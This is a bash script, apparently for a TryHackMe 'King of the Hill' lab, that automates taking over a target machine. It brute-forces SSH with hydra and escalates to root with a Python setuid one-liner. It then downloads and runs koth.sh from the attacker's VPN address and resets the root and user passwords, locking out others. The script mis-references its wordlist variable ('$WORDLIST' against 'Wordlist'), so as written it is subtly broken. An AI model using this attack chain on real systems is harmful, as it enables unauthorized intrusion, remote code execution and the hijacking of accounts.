#!/bin/bash

missing() {
  if ! command -v "$1" >/dev/null 2>&1; then
    echo "Install '$1' before running $0 script."
    exit 1
  fi
}

missing sshpass 
missing hydra

while getopts ":i:u:p:w:" opt; do
  case $opt in
    i) IP="$OPTARG" ;;
    u) username="$OPTARG" ;;
    p) new_password="$OPTARG" ;;
    w) Wordlist="$OPTARG" ;;
  esac
done
if [ -z "$IP" ] || [ -z "$username" ] || [ -z "$new_password" ] || [ -z "$Wordlist" ]; then
  echo "Usage: $0 -i 'The machine IP' -u 'Your username on thm' -p 'The new password' -w 'Wordlist Path'"
  exit 1
fi

pass=$(hydra -l rcampbell -P "$WORDLIST" ssh://"$IP" -t 64 | grep -oP "password: \K.*")

vpn=$(ip a show dev tun0 | awk '/inet / {print $2}' | cut -d'/' -f1)

sshpass -p "$pass" ssh -o StrictHostKeyChecking=no rcampbell@"$IP" << EOF
    /usr/bin/python3.6 -c 'import os; os.setuid(0); os.system("/bin/sh")'
    cd /boot && wget http://$vpn/koth.sh && chmod +x koth.sh && ./koth.sh "$vpn" "$username"
    echo "root:$new_password" | chpasswd
    echo "rcampbell:$new_password" | chpasswd
    echo "gcrawford:$new_password" | chpasswd
    echo "tryhackme:$new_password" | chpasswd
    echo "production:$new_password" | chpasswd
    rm -rf /home/gcrawford/.ssh
EOF


